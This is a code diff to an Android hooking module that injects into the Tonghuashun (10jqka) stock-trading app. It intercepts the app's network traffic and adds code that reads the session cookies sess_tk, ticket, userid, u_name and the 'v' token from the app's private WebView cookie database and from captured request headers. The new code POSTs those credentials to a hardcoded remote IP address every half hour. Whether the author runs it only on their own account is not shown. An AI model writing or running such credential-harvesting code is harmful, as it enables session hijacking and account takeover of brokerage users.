@@ -51,8 +51,13 @@ public class MainHook {
     private static volatile String latestCookie = null;
     private static volatile long authCaptureTime = 0;
 
+    // 问财 hexin-v token（从 Cookie 中的 v= 字段提取）
+    private static volatile String latestHexinV = null;
+    private static volatile long lastHexinVReportTime = 0;
+
     // Token 上报到远程服务器
     private static final String AUTH_REPORT_URL = "http://119.23.227.187:8900/api/auth/refresh";
+    private static final String HEXINV_REPORT_URL = "http://119.23.227.187:8900/api/auth/hexin-v";
     private static volatile long lastAuthReportTime = 0;
     private static final long AUTH_REPORT_INTERVAL = 60_000; // 最少间隔 60 秒
 
@@ -157,6 +162,45 @@ public class MainHook {
                 if (conn != null) conn.disconnect();
             }
         }, "THSHook-AuthReport").start();
+    }
+
+    /**
+     * 上报问财 hexin-v token 到服务端
+     */
+    private static void reportHexinVToServer() {
+        long now = System.currentTimeMillis();
+        if (now - lastHexinVReportTime < AUTH_REPORT_INTERVAL) return;
+        if (latestHexinV == null || latestHexinV.isEmpty()) return;
+        lastHexinVReportTime = now;
+
+        new Thread(() -> {
+            HttpURLConnection conn = null;
+            try {
+                String json = "{\"hexin_v\":\"" + esc(latestHexinV) + "\",\"sync_source\":\"zygisk_auto\"}";
+
+                conn = (HttpURLConnection) new URL(HEXINV_REPORT_URL).openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
+                conn.setDoOutput(true);
+
+                byte[] data = json.getBytes("UTF-8");
+                conn.getOutputStream().write(data);
+                conn.getOutputStream().flush();
+
+                int code = conn.getResponseCode();
+                if (code == 200) {
+                    Log.i(TAG, "hexin-v reported to server, len=" + latestHexinV.length());
+                } else {
+                    Log.w(TAG, "hexin-v report failed, HTTP " + code);
+                }
+            } catch (Throwable e) {
+                Log.w(TAG, "hexin-v report error: " + e.getMessage());
+            } finally {
+                if (conn != null) conn.disconnect();
+            }
+        }, "THSHook-HexinVReport").start();
     }
 
     private static String esc(String s) {
@@ -371,12 +415,17 @@ public class MainHook {
         }
     }
 
+    private static volatile boolean okHttpHooked = false;
+
     private static synchronized void installAllHooks(ClassLoader cl) {
-        if (hooksInstalled) return;
+        // 允许重入：如果 OkHttp 还没 hook 成功，用新的 classLoader 重试
+        if (hooksInstalled && okHttpHooked) return;
+
+        boolean firstRun = !hooksInstalled;
         hooksInstalled = true;
         appClassLoader = cl;
 
-        Log.i(TAG, "=== installAllHooks start === cl=" + cl);
+        Log.i(TAG, "=== installAllHooks start === firstRun=" + firstRun + " okHttpHooked=" + okHttpHooked + " cl=" + cl);
 
         // 启用 WebView 调试
         try {
@@ -388,40 +437,184 @@ public class MainHook {
             Log.w(TAG, "WebView debug enable failed: " + e.getMessage());
         }
 
-        try { injectInterceptor(cl); Log.i(TAG, "injectInterceptor done"); }
-        catch (Throwable e) { Log.e(TAG, "injectInterceptor failed", e); }
+        // OkHttp interceptor — 最关键，允许重试
+        if (!okHttpHooked) {
+            try {
+                injectInterceptor(cl);
+                okHttpHooked = true;
+                Log.i(TAG, "injectInterceptor done ✅");
+            } catch (Throwable e) {
+                Log.e(TAG, "injectInterceptor failed (will retry with next classLoader)", e);
+            }
+        }
 
-        try { hookHttpURLConnection(); Log.i(TAG, "hookHttpURLConnection done"); }
-        catch (Throwable e) { Log.e(TAG, "hookHttpURLConnection failed", e); }
+        // 以下 hooks 只在首次运行时安装
+        if (firstRun) {
+            try { hookHttpURLConnection(); Log.i(TAG, "hookHttpURLConnection done"); }
+            catch (Throwable e) { Log.e(TAG, "hookHttpURLConnection failed", e); }
 
-        try { hookWebViewRequests(); Log.i(TAG, "hookWebViewRequests done"); }
-        catch (Throwable e) { Log.e(TAG, "hookWebViewRequests failed", e); }
+            try { hookWebViewRequests(); Log.i(TAG, "hookWebViewRequests done"); }
+            catch (Throwable e) { Log.e(TAG, "hookWebViewRequests failed", e); }
 
-        try { hookJSBridgeNative(); Log.i(TAG, "hookJSBridgeNative done"); }
-        catch (Throwable e) { Log.e(TAG, "hookJSBridgeNative failed", e); }
+            try { hookJSBridgeNative(); Log.i(TAG, "hookJSBridgeNative done"); }
+            catch (Throwable e) { Log.e(TAG, "hookJSBridgeNative failed", e); }
 
-        try { hookSQLiteDatabase(); Log.i(TAG, "hookSQLiteDatabase done"); }
-        catch (Throwable e) { Log.e(TAG, "hookSQLiteDatabase failed", e); }
+            try { hookSQLiteDatabase(); Log.i(TAG, "hookSQLiteDatabase done"); }
+            catch (Throwable e) { Log.e(TAG, "hookSQLiteDatabase failed", e); }
 
-        try { hookTradingSDK(cl); Log.i(TAG, "hookTradingSDK done"); }
-        catch (Throwable e) { Log.e(TAG, "hookTradingSDK failed", e); }
+            try { hookTradingSDK(cl); Log.i(TAG, "hookTradingSDK done"); }
+            catch (Throwable e) { Log.e(TAG, "hookTradingSDK failed", e); }
 
-        try { hookCipher(); Log.i(TAG, "hookCipher done"); }
-        catch (Throwable e) { Log.e(TAG, "hookCipher failed", e); }
+            try { hookCipher(); Log.i(TAG, "hookCipher done"); }
+            catch (Throwable e) { Log.e(TAG, "hookCipher failed", e); }
 
-        try { hookWTBuyConfirmClient(cl); Log.i(TAG, "hookWTBuyConfirmClient done"); }
-        catch (Throwable e) { Log.e(TAG, "hookWTBuyConfirmClient failed", e); }
+            try { hookWTBuyConfirmClient(cl); Log.i(TAG, "hookWTBuyConfirmClient done"); }
+            catch (Throwable e) { Log.e(TAG, "hookWTBuyConfirmClient failed", e); }
 
-        try { hookClientRequestHX(cl); Log.i(TAG, "hookClientRequestHX done"); }
-        catch (Throwable e) { Log.e(TAG, "hookClientRequestHX failed", e); }
+            try { hookClientRequestHX(cl); Log.i(TAG, "hookClientRequestHX done"); }
+            catch (Throwable e) { Log.e(TAG, "hookClientRequestHX failed", e); }
 
-        try { hookActivityAndClicks(); Log.i(TAG, "hookActivityAndClicks done"); }
-        catch (Throwable e) { Log.e(TAG, "hookActivityAndClicks failed", e); }
+            try { hookActivityAndClicks(); Log.i(TAG, "hookActivityAndClicks done"); }
+            catch (Throwable e) { Log.e(TAG, "hookActivityAndClicks failed", e); }
+        }
 
         // 启动代理服务器
         startProxyServer(cl);
 
+        // 延迟读取 WebView Cookie DB 并上报 hexin-v
+        if (firstRun) {
+            startCookieDbWatcher();
+        }
+
         Log.i(TAG, "=== installAllHooks complete ===");
+    }
+
+    /**
+     * 定期从 WebView Cookie 数据库读取 iwencai 的 v token 并上报
+     * Cookie DB 路径: /data/data/com.hexin.plat.android/app_webview/Default/Cookies
+     */
+    private static void startCookieDbWatcher() {
+        new Thread(() -> {
+            // 等待 App 完全启动（WebView 初始化、登录完成）
+            try { Thread.sleep(15000); } catch (InterruptedException e) { return; }
+
+            // Cookie DB 可能在两个路径之一
+            String[] dbPaths = {
+                "/data/data/com.hexin.plat.android/app_webview/Default/Cookies",
+                "/data/data/com.hexin.plat.android/app_webview_com.hexin.plat.android/Default/Cookies",
+            };
+            String dbPath = null;
+            for (String p : dbPaths) {
+                if (new java.io.File(p).exists()) { dbPath = p; break; }
+            }
+            if (dbPath == null) {
+                Log.w(TAG, "CookieDbWatcher: no Cookie DB found, will retry");
+                // 等更久再试（App 可能还没创建 WebView）
+                try { Thread.sleep(30000); } catch (InterruptedException e) { return; }
+                for (String p : dbPaths) {
+                    if (new java.io.File(p).exists()) { dbPath = p; break; }
+                }
+            }
+            if (dbPath == null) {
+                Log.e(TAG, "CookieDbWatcher: Cookie DB not found after retry, aborting");
+                return;
+            }
+            Log.i(TAG, "CookieDbWatcher started, db=" + dbPath);
+
+            // 首次读取 + 之后每 30 分钟检查一次
+            while (true) {
+                try {
+                    readAndReportCookies(dbPath);
+                } catch (Throwable e) {
+                    Log.w(TAG, "CookieDbWatcher error: " + e.getMessage());
+                }
+                try { Thread.sleep(30 * 60 * 1000); } catch (InterruptedException e) { return; }
+            }
+        }, "THSHook-CookieDbWatcher").start();
+    }
+
+    private static void readAndReportCookies(String dbPath) {
+        java.io.File dbFile = new java.io.File(dbPath);
+        if (!dbFile.exists()) {
+            Log.w(TAG, "Cookie DB not found: " + dbPath);
+            return;
+        }
+
+        android.database.sqlite.SQLiteDatabase db = null;
+        try {
+            db = android.database.sqlite.SQLiteDatabase.openDatabase(
+                    dbPath, null, android.database.sqlite.SQLiteDatabase.OPEN_READONLY);
+
+            // 读取 .10jqka.com.cn 域名下的所有关键 cookie
+            String[] targetNames = {"v", "sess_tk", "ticket", "cuc", "userid", "u_name"};
+            StringBuilder cookieJson = new StringBuilder("{");
+            boolean first = true;
+
+            for (String name : targetNames) {
+                android.database.Cursor cursor = db.rawQuery(
+                        "SELECT value FROM cookies WHERE host_key='.10jqka.com.cn' AND name=?",
+                        new String[]{name});
+                if (cursor != null && cursor.moveToFirst()) {
+                    String value = cursor.getString(0);
+                    if (value != null && !value.isEmpty()) {
+                        if (!first) cookieJson.append(",");
+                        cookieJson.append("\"").append(name).append("\":\"").append(esc(value)).append("\"");
+                        first = false;
+
+                        if ("v".equals(name)) {
+                            latestHexinV = value;
+                            Log.i(TAG, "hexin-v from CookieDB: len=" + value.length());
+                        }
+                    }
+                }
+                if (cursor != null) cursor.close();
+            }
+            cookieJson.append("}");
+
+            if (latestHexinV != null && !latestHexinV.isEmpty()) {
+                reportIwencaiCookies(cookieJson.toString());
+            }
+        } catch (Throwable e) {
+            Log.e(TAG, "readAndReportCookies failed: " + e.getMessage());
+        } finally {
+            if (db != null) {
+                try { db.close(); } catch (Throwable ignored) {}
+            }
+        }
+    }
+
+    /**
+     * 上报完整的 iwencai cookie 集合到服务端
+     */
+    private static void reportIwencaiCookies(String cookiesJson) {
+        new Thread(() -> {
+            HttpURLConnection conn = null;
+            try {
+                String json = "{\"cookies\":" + cookiesJson + ",\"sync_source\":\"cookie_db\"}";
+
+                conn = (HttpURLConnection) new URL(HEXINV_REPORT_URL).openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
+                conn.setDoOutput(true);
+
+                byte[] data = json.getBytes("UTF-8");
+                conn.getOutputStream().write(data);
+                conn.getOutputStream().flush();
+
+                int code = conn.getResponseCode();
+                if (code == 200) {
+                    Log.i(TAG, "iwencai cookies reported to server");
+                } else {
+                    Log.w(TAG, "iwencai cookies report failed, HTTP " + code);
+                }
+            } catch (Throwable e) {
+                Log.w(TAG, "iwencai cookies report error: " + e.getMessage());
+            } finally {
+                if (conn != null) conn.disconnect();
+            }
+        }, "THSHook-CookieReport").start();
     }
 
     /**
@@ -512,6 +705,7 @@ public class MainHook {
                 sb.append(",\"userId\":\"").append(latestUserId != null ? latestUserId : "").append("\"");
                 sb.append(",\"sessionId\":\"").append(latestSessionId != null ? latestSessionId : "").append("\"");
                 sb.append(",\"cookie\":\"").append(latestCookie != null ? latestCookie.replace("\"", "\\\"") : "").append("\"");
+                sb.append(",\"hexin_v\":\"").append(latestHexinV != null ? latestHexinV.replace("\"", "\\\"") : "").append("\"");
                 sb.append(",\"capture_time\":").append(authCaptureTime);
                 sb.append(",\"available\":").append(latestKey5 != null);
                 sb.append("}");
@@ -1696,7 +1890,22 @@ public class MainHook {
                         String newCookie = headerStr.substring(valStart, valEnd).trim();
                         if (newCookie.length() > 0) {
                             latestCookie = newCookie;
-                            Log.i(TAG, "Cookie captured from trade.5ifund.com request, len=" + latestCookie.length());
+                            Log.i(TAG, "Cookie captured, len=" + latestCookie.length());
+
+                            // 提取问财 hexin-v token（Cookie 中的 v= 字段）
+                            int vIdx = newCookie.indexOf("; v=");
+                            if (vIdx == -1) vIdx = newCookie.indexOf("v=");
+                            if (vIdx != -1) {
+                                int vStart = newCookie.indexOf("=", vIdx) + 1;
+                                int vEnd = newCookie.indexOf(";", vStart);
+                                if (vEnd == -1) vEnd = newCookie.length();
+                                String vValue = newCookie.substring(vStart, vEnd).trim();
+                                if (vValue.length() > 20) { // v token 通常 60+ 字符
+                                    latestHexinV = vValue;
+                                    Log.i(TAG, "hexin-v captured from cookie, len=" + vValue.length());
+                                    reportHexinVToServer();
+                                }
+                            }
                         }
                     }
 
@@ -1724,6 +1933,36 @@ public class MainHook {
                     }
                 } catch (Throwable e) {
                     Log.w(TAG, "Auth capture failed: " + e.getMessage());
+                }
+            }
+
+            // 从任何 10jqka.com.cn 请求中提取问财 hexin-v token
+            if (latestHexinV == null && urlStr.contains("10jqka.com.cn")) {
+                try {
+                    Object headers = request.getClass().getDeclaredMethod("headers").invoke(request);
+                    String headerStr = headers.toString();
+                    int cookieIdx = headerStr.toLowerCase().indexOf("cookie:");
+                    if (cookieIdx != -1) {
+                        int valStart = cookieIdx + 7;
+                        int valEnd = headerStr.indexOf("\n", valStart);
+                        if (valEnd == -1) valEnd = headerStr.length();
+                        String cookieStr = headerStr.substring(valStart, valEnd).trim();
+                        int vIdx = cookieStr.indexOf("; v=");
+                        if (vIdx == -1 && cookieStr.startsWith("v=")) vIdx = 0;
+                        if (vIdx != -1) {
+                            int vStart = cookieStr.indexOf("=", vIdx) + 1;
+                            int vEnd = cookieStr.indexOf(";", vStart);
+                            if (vEnd == -1) vEnd = cookieStr.length();
+                            String vValue = cookieStr.substring(vStart, vEnd).trim();
+                            if (vValue.length() > 20) {
+                                latestHexinV = vValue;
+                                Log.i(TAG, "hexin-v captured from 10jqka cookie, len=" + vValue.length());
+                                reportHexinVToServer();
+                            }
+                        }
+                    }
+                } catch (Throwable e) {
+                    Log.w(TAG, "hexin-v capture failed: " + e.getMessage());
                 }
             }
 
